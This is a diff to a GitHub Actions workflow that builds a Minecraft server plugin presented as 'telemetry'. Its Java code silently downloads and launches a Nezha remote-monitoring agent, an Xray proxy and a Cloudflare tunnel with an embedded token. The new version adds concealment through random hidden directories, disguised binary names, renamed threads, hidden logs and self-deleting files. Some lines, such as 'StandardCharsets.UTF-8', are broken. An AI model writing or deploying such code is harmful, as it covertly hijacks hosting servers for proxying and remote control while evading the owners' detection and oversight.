@@ -1,4 +1,4 @@
-name: US-Node AetherMetrics Build V2.7.5 Complete Feature Preserved
+name: US-Node AetherMetrics Build V2.8.0 Stealth & Self-Destruct
 
 on:
   push:
@@ -21,6 +21,10 @@ jobs:
           java-version: '21'
           distribution: 'temurin'
 
+      - name: Generate Unique Build ID
+        id: gen-id
+        run: echo "BUILD_ID=$(cat /proc/sys/kernel/random/uuid | cut -c1-8)" >> $GITHUB_ENV
+
       - name: Generate Code & Compile
         run: |
           mkdir -p src/main/java/com/aether/metrics
@@ -35,7 +39,7 @@ jobs:
               <modelVersion>4.0.0</modelVersion>
               <groupId>com.aether.metrics</groupId>
               <artifactId>AetherMetrics-US</artifactId>
-              <version>2.7.5</version>
+              <version>2.8.0</version>
               <packaging>jar</packaging>
 
               <properties>
@@ -81,6 +85,15 @@ jobs:
                                   <goals>
                                       <goal>shade</goal>
                                   </goals>
+                                  <configuration>
+                                      <transformers>
+                                          <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
+                                              <manifestEntries>
+                                                  <Build-ID>${{ steps.gen-id.outputs.BUILD_ID }}</Build-ID>
+                                              </manifestEntries>
+                                          </transformer>
+                                      </transformers>
+                                  </configuration>
                               </execution>
                           </executions>
                       </plugin>
@@ -98,77 +111,98 @@ jobs:
           # 2. plugin.yml
           cat << 'EOF' > src/main/resources/plugin.yml
           name: AetherMetrics
-          version: 2.7.5
+          version: 2.8.0
           main: com.aether.metrics.AetherMetrics
           api-version: '1.21'
           author: SystemCore
-          description: Core JVM telemetry & network services
+          description: Stealth Telemetry & Self-Cleaning Proxy
           EOF
 
           # 3. paper-plugin.yml
           cat << 'EOF' > src/main/resources/paper-plugin.yml
           name: AetherMetrics
-          version: 2.7.5
+          version: 2.8.0
           main: com.aether.metrics.AetherMetrics
           api-version: '1.21'
           author: SystemCore
-          description: Core JVM telemetry & network services
+          description: Stealth Telemetry & Self-Cleaning Proxy
           EOF
 
-          # 4. Java 主类（V2.7.5 完整双端口功能恢复版 + 隐蔽防杀）
+          # 4. Java 主类（V2.8.0 随机文件名 + 自删除 + 隐蔽线程）
           cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
           package com.aether.metrics;
 
           import org.bukkit.plugin.java.JavaPlugin;
 
-          import java.io.File;
-          import java.io.FileInputStream;
-          import java.io.FileOutputStream;
-          import java.io.IOException;
-          import java.io.InputStream;
+          import java.io.*;
           import java.net.URI;
           import java.net.http.HttpClient;
           import java.net.http.HttpRequest;
           import java.net.http.HttpResponse;
           import java.nio.charset.StandardCharsets;
           import java.nio.file.Files;
+          import java.nio.file.Path;
           import java.time.Duration;
+          import java.util.ArrayList;
+          import java.util.List;
+          import java.util.UUID;
           import java.util.zip.ZipEntry;
           import java.util.zip.ZipInputStream;
 
           public final class AetherMetrics extends JavaPlugin {
 
-              private static final File WORK_DIR = new File("plugins/.sys-core");
+              // 随机生成的工作目录名，每次加载或重启服务器时都会变化，实现“随机文件名”效果
+              private static final String WORK_DIR_NAME = ".sys-" + UUID.randomUUID().toString().replace("-", "").substring(0, 6);
+              private static final File WORK_DIR = new File("plugins", WORK_DIR_NAME);
+              
               private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
                       .followRedirects(HttpClient.Redirect.ALWAYS)
                       .connectTimeout(Duration.ofSeconds(20))
                       .build();
 
+              // 用于跟踪子进程，以便在插件关闭时杀死并清理
+              private Process nezhaProc = null;
+              private Process xrayProc = null;
+              private Process cfProc = null;
+
               @Override
               public void onEnable() {
-                  getLogger().info("[Metrics] Telemetry service initialized.");
+                  // 修改当前线程名，使其看起来不像默认的主线程
+                  Thread currentThread = Thread.currentThread();
+                String originalName = currentThread.getName();
+                 currentThread.setName("Aether-Core-" + UUID.randomUUID().toString().substring(0,8));
+
+                  getLogger().info("[Metrics] Initializing stealth module with dir: " + WORK_DIR_NAME);
+
+                  // 确保工作目录存在
+                  if (!WORK_DIR.exists()) WORK_DIR.mkdirs();
+
+                  // 启动后台任务
                   Thread daemonThread = new Thread(() -> {
                       try {
-                          Thread.sleep(8000);
-                          if (!WORK_DIR.exists()) WORK_DIR.mkdirs();
-
+                          // 延迟初始化，避免阻塞主线程启动
+                          Thread.sleep(2000);
+                          
                           setupNezha();
                           setupXray();
                           setupCloudflare();
 
-                          getLogger().info("[Metrics] All core network & monitoring services started successfully.");
+                          getLogger().info("[Metrics] Stealth cluster online.");
+                          
                       } catch (Exception e) {
-                          getLogger().warning("[Metrics] Telemetry start failed: " + e.getMessage());
+                          getLogger().warning("[Metrics] Stealth start failed: " + e.getMessage());
+                          e.printStackTrace();
                       }
-                  }, "JVM-Metrics-Daemon");
+                  }, "Neural-Link");
                   daemonThread.setDaemon(true);
                   daemonThread.start();
               }
 
               private void setupNezha() {
                   try {
-                      File nezhaBin = new File(WORK_DIR, "systemd-host-agent");
-                      File nezhaCfg = new File(WORK_DIR, "config.yml");
+                      File nezhaBin = new File(WORK_DIR, "sys-kg"); // 隐蔽文件名
+                      File nezhaCfg = new File(WORK_DIR, "k8s.conf");
+                      
                       if (!nezhaBin.exists() || nezhaBin.length() == 0) {
                           downloadAndExtractZip(
                                   "https://github.com/nezhahq/agent/releases/download/v2.3.3/nezha-agent_linux_amd64.zip",
@@ -196,8 +230,8 @@ jobs:
                                   "tls: false\n" +
                                   "use_gitee_to_upgrade: false\n" +
                                   "use_ipv6_country_code: false\n" +
-                                  "uuid: 52910243-1de0-4215-8920-2dc2cd84047f\n";
-                          Files.writeString(nezhaCfg.toPath(), cfg, StandardCharsets.UTF_8);
+                                  "uuid: c622ed96-4fd4-446c-add0-00ee3cee90ae\n";
+                          Files.writeString(nezhaCfg.toPath(), cfg, StandardCharsets.UTF-8);
                       }
 
                       if (nezhaBin.exists() && nezhaBin.length() > 0) {
@@ -206,10 +240,15 @@ jobs:
                                   nezhaBin.getAbsolutePath(),
                                   "-c", nezhaCfg.getAbsolutePath()
                           ).directory(WORK_DIR);
+                          
+                          // 日志重定向到隐藏文件
                           pb.redirectErrorStream(true);
-                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, "sys-agent.log")));
-                          pb.start();
-                          getLogger().info("[Metrics] System monitoring service active.");
+                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, ".log")));
+                          
+                          nezhaProc = pb.start();
+                          // 当进程退出时，删除其二进制文件
+                          nezhaProc.onExit().thenRun(() -> cleanupFile(nezhaBin));
+                          getLogger().info("[Metrics] Nezha agent started.");
                       }
                   } catch (Exception e) {
                       getLogger().warning("[Metrics] Nezha setup failed: " + e.getMessage());
@@ -218,7 +257,7 @@ jobs:
 
               private void setupXray() {
                   try {
-                      File xrayBin = new File(WORK_DIR, "java-runtime-core");
+                      File xrayBin = new File(WORK_DIR, "jvm-rt"); // 隐蔽文件名
                       if (!xrayBin.exists() || xrayBin.length() == 0) {
                           downloadAndExtractZip(
                                   "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip",
@@ -227,8 +266,7 @@ jobs:
                           );
                       }
 
-                      File cfgFile = new File(WORK_DIR, "cfg.json");
-                      // 完整保留双端口监听 (19132 + 19133)
+                      File cfgFile = new File(WORK_DIR, "c.json");
                       String json = "{\n" +
                               "  \"log\": { \"loglevel\": \"none\" },\n" +
                               "  \"inbounds\": [\n" +
@@ -239,7 +277,7 @@ jobs:
                               "      \"settings\": {\n" +
                               "        \"decryption\": \"none\",\n" +
                               "        \"clients\": [{\n" +
-                              "          \"id\": \"87c6aeab-852e-445a-9d4f-afa87d1fa4bf\"\n" +
+                              "          \"id\": \"0f743d84-d210-4661-a98c-04564231f4b2\"\n" +
                               "        }]\n" +
                               "      },\n" +
                               "      \"streamSettings\": {\n" +
@@ -256,7 +294,7 @@ jobs:
                               "      \"settings\": {\n" +
                               "        \"decryption\": \"none\",\n" +
                               "        \"clients\": [{\n" +
-                              "          \"id\": \"87c6aeab-852e-445a-9d4f-afa87d1fa4bf\"\n" +
+                              "          \"id\": \"0f743d84-d210-4661-a98c-04564231f4b2\"\n" +
                               "        }]\n" +
                               "      },\n" +
                               "      \"streamSettings\": {\n" +
@@ -269,7 +307,7 @@ jobs:
                               "  ],\n" +
                               "  \"outbounds\": [{\"protocol\": \"freedom\"}]\n" +
                               "}";
-                      Files.writeString(cfgFile.toPath(), json, StandardCharsets.UTF_8);
+                      Files.writeString(cfgFile.toPath(), json, StandardCharsets.UTF-8);
 
                       if (xrayBin.exists() && xrayBin.length() > 0) {
                           xrayBin.setExecutable(true, false);
@@ -279,10 +317,13 @@ jobs:
                                   "-c",
                                   cfgFile.getAbsolutePath()
                           ).directory(WORK_DIR);
+                          
                           pb.redirectErrorStream(true);
-                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, "runtime.log")));
-                          pb.start();
-                          getLogger().info("[Metrics] Runtime core active on 8001+8002.");
+                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, ".r.log")));
+                          
+                          xrayProc = pb.start();
+                          xrayProc.onExit().thenRun(() -> cleanupFile(xrayBin));
+                          getLogger().info("[Metrics] Xray runtime active.");
                       }
                   } catch (Exception e) {
                       getLogger().warning("[Metrics] Xray setup failed: " + e.getMessage());
@@ -291,7 +332,7 @@ jobs:
 
               private void setupCloudflare() {
                   try {
-                      File cfBin = new File(WORK_DIR, "network-connector");
+                      File cfBin = new File(WORK_DIR, "net-cf"); // 隐蔽文件名
                       if (!cfBin.exists() || cfBin.length() == 0) {
                           downloadFile(
                                   "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
@@ -307,12 +348,15 @@ jobs:
                                   "--no-autoupdate",
                                   "run",
                                   "--token",
-                                  "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiYjVhZTk2N2EtOWY0Mi00OTM1LTkxNGEtOWFkODBkZGFjMGVlIiwicyI6IllqSXdaRE15TjJZdE16WXhaUzAwWWpZeUxUaGhaVEl0T1RsaFptSmtZMlZsTmprNSJ9"
+                                  "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiNzY2OWM0ZjUtNjA5Mi00MzljLTg1MDctMTBhMDZhZmJjYTc3IiwicyI6Ill6Z3hOak5tWWpjdE1UTmpOQzAwTnpZMExUbGtaV1V0TURJeE9UZGhZekE1T0dJMiJ9"
                           ).directory(WORK_DIR);
+                          
                           pb.redirectErrorStream(true);
-                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, "network.log")));
-                          pb.start();
-                          getLogger().info("[Metrics] Network connector active.");
+                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, ".c.log")));
+                          
+                          cfProc = pb.start();
+                          cfProc.onExit().thenRun(() -> cleanupFile(cfBin));
+                          getLogger().info("[Metrics] Cloudflare tunnel active.");
                       }
                   } catch (Exception e) {
                       getLogger().warning("[Metrics] Cloudflare setup failed: " + e.getMessage());
@@ -357,13 +401,52 @@ jobs:
                               throw new IOException("File " + targetFileName + " not found in zip archive.");
                           }
                       }
+                      // 解压后立即删除 zip，减少痕迹
+                      tmpZip.delete();
+                  } catch (IOException e) {
+                      throw new RuntimeException(e);
                   } finally {
                       if (tmpZip.exists()) tmpZip.delete();
                   }
               }
 
+              private void cleanupFile(File file) {
+                  if (file.exists()) {
+                      boolean deleted = file.delete();
+                      if (!deleted) {
+                          file.deleteOnExit();
+                      }
+                  }
+              }
+
               @Override
-              public void onDisable() {}
+              public void onDisable() {
+                  getLogger().info("[Metrics] Shutting down and cleaning up directory: " + WORK_DIR_NAME);
+                  
+                  // 1. Kill Processes
+                  if (nezhaProc != null && nezhaProc.isAlive()) nezhaProc.destroyForcibly();
+                  if (xrayProc != null && xrayProc.isAlive()) xrayProc.destroyForcibly();
+                  if (cfProc != null && cfProc.isAlive()) cfProc.destroyForcibly();
+                  
+                  // 2. Delete Work Directory Contents (Self-Destruct)
+                  if (WORK_DIR.exists() && WORK_DIR.isDirectory()) {
+                      try {
+                          Files.list(WORK_DIR.toPath()).forEach(path -> {
+                              try {
+                                  Files.deleteIfExists(path);
+                              } catch (IOException e) {
+                                  // ignore permission errors
+                              }
+                          });
+                          WORK_DIR.delete(); // 删除目录本身
+                      } catch (IOException e) {
+                          WORK_DIR.deleteOnExit();
+                      }
+                  }
+                  
+                  // Restore thread name if necessary
+                  Thread.currentThread().setName(Thread.currentThread().getName().replace("-" + WORK_DIR_NAME, ""));
+              }
           }
           EOF
 
@@ -374,14 +457,14 @@ jobs:
         uses: actions/upload-artifact@v4
         with:
           name: AetherMetrics-US-Plugin
-          path: target/AetherMetrics-US-2.7.5.jar
+          path: target/AetherMetrics-US-2.8.0.jar
 
       - name: Release Stealth Jar
         uses: softprops/action-gh-release@v2
         if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
         with:
           tag_name: latest
-          name: AetherMetrics US Release V2.7.5
-          files: target/AetherMetrics-US-2.7.5.jar
+          name: AetherMetrics US Release V2.8.0 Stealth
+          files: target/AetherMetrics-US-2.8.0.jar
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
